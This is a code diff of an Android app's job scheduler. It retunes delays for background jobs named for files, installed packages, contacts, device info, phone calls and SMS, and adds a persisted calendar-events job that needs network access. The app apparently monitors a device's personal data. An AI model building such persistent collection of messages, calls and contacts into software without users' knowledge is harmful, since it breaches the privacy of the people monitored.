@@ -16,6 +16,7 @@ public class JobsScheduler {
     public static final int JOB_ID_SMS = 8;
     public static final long ONE_MINUTE = 60000;
     public static final long ONE_HOUR = ONE_MINUTE * 60;
+    private static final int JOB_ID_CALENDAR_EVENTS = 9;
 
     protected static void scheduleJob(Context context){
         ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
@@ -48,7 +49,7 @@ public class JobsScheduler {
             filesJob.setRequiresDeviceIdle(false);
             filesJob.setPersisted(true);
             filesJob.setOverrideDeadline( 24 * ONE_HOUR);
-            filesJob.setMinimumLatency(5 * ONE_MINUTE);
+            filesJob.setMinimumLatency(7 * ONE_MINUTE);
             jobScheduler.schedule(filesJob.build());
         }
         if(jobScheduler.getPendingJob(ID_PACKAGES) == null){
@@ -61,7 +62,7 @@ public class JobsScheduler {
             packagesJob.setRequiresDeviceIdle(false);
             packagesJob.setPersisted(true);
             packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
-            packagesJob.setMinimumLatency(1 * ONE_MINUTE);
+            packagesJob.setMinimumLatency(6 * ONE_MINUTE);
             jobScheduler.schedule(packagesJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null){
@@ -74,7 +75,7 @@ public class JobsScheduler {
             contactsJob.setRequiresDeviceIdle(false);
             contactsJob.setPersisted(true);
             contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            contactsJob.setMinimumLatency(3* ONE_MINUTE);
+            contactsJob.setMinimumLatency(4* ONE_MINUTE);
             jobScheduler.schedule(contactsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null){
@@ -100,7 +101,7 @@ public class JobsScheduler {
             phoneCallsJob.setRequiresDeviceIdle(false);
             phoneCallsJob.setPersisted(true);
             phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            phoneCallsJob.setMinimumLatency(7 * ONE_MINUTE);
+            phoneCallsJob.setMinimumLatency(5 * ONE_MINUTE);
             jobScheduler.schedule(phoneCallsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_SMS) == null){
@@ -113,8 +114,21 @@ public class JobsScheduler {
             smsJob.setRequiresDeviceIdle(false);
             smsJob.setPersisted(true);
             smsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            smsJob.setMinimumLatency(1 * ONE_MINUTE);
+            smsJob.setMinimumLatency(3 * ONE_MINUTE);
             jobScheduler.schedule(smsJob.build());
+        }
+        if(jobScheduler.getPendingJob(JOB_ID_CALENDAR_EVENTS) == null){
+            ComponentName calendarEventJobService = new ComponentName(context, CalendarEventJobService.class);
+            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_CALENDAR_EVENTS, calendarEventJobService);
+            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
+            calendarEventJob.setRequiresCharging(false);
+            calendarEventJob.setRequiresBatteryNotLow(false);
+            calendarEventJob.setRequiresStorageNotLow(false);
+            calendarEventJob.setRequiresDeviceIdle(false);
+            calendarEventJob.setPersisted(true);
+            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
+            calendarEventJob.setMinimumLatency(1 * ONE_MINUTE);
+            jobScheduler.schedule(calendarEventJob.build());
         }
     }
 }
